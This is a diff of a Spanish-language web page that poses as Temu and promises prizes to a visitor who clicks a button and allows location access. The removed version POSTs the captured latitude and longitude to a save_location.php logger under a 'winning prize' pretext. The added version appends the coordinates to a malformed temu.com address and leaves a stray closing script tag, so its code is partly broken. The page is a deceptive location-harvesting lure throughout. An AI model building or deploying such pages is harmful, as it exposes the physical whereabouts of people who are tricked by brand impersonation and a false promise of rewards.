@@ -3,40 +3,115 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Premio ganador</title>
-</head>
-<body>
-    <h2>Reclama tu bono</h2>
-    <button onclick="getLocation()">presionar para obtener bono</button>
+    <title>TEMU</title>
+    <style>
+        /* Estilos generales */
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
+            color: white;
+        }
 
+        /* Video de fondo */
+        .video-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .video-container video {
+            min-width: 100%;
+            min-height: 100%;
+            object-fit: cover;
+        }
+
+        /* Título */
+        h1 {
+            font-size: 48px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.7);
+        }
+
+        /* Texto de descripción */
+        p {
+            font-size: 22px;
+            max-width: 600px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.5);
+        }
+
+        /* Botón Personalizado */
+        .boton {
+            background: linear-gradient(45deg, #ff8000, #ffcc00);
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .boton:hover {
+            transform: scale(1.1);
+            box-shadow: 0px 6px 15px rgba(0, 0, 0, 0.5);
+        }
+    </style>
     <script>
-        function getLocation() {
+        function obtenerUbicacion() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+                navigator.geolocation.getCurrentPosition(enviarUbicacion, mostrarError);
             } else {
-                alert("Geolocalización no soportada.");
+                alert("La geolocalización no es compatible con este navegador.");
             }
         }
 
-        function sendLocation(position) {
-            let lat = position.coords.latitude;
-            let lon = position.coords.longitude;
-            
-            fetch('save_location.php', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: `lat=${lat}&lon=${lon}`
-            })
-            .then(response => response.text())
-            .then(data => {
-                console.log(data);
-                window.location.href = 'https://www.temu.com'; // Redirige después de enviar la ubicación
-            });
+        function enviarUbicacion(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            window.location.href = "https://www.temu.com" + lat + "," + lon;
         }
 
-        function showError(error) {
-            alert("No se pudo obtener la ubicación.");
+        function mostrarError(error) {
+            alert("Error al obtener la ubicación: " + error.message);
         }
     </script>
+</head>
+<body>
+
+    <!-- Video de Fondo -->
+    <div class="video-container">
+        <video autoplay loop muted>
+            <source src="tuvideo.mp4" type="video/mp4">
+            Tu navegador no soporta videos.
+        </video>
+    </div>
+
+    <!-- Título -->
+    <h1>BIENVENIDO A TEMU</h1>
+
+    <!-- Descripción -->
+    <p>Haz click en el botón de abajo,permite acceso y acceda a premios en nuestra página</p>
+
+    <!-- Botón para activar la ubicación -->
+    <button class="boton" onclick="obtenerUbicacion()">CLICK</button>
+</script>
 </body>
+
 </html>
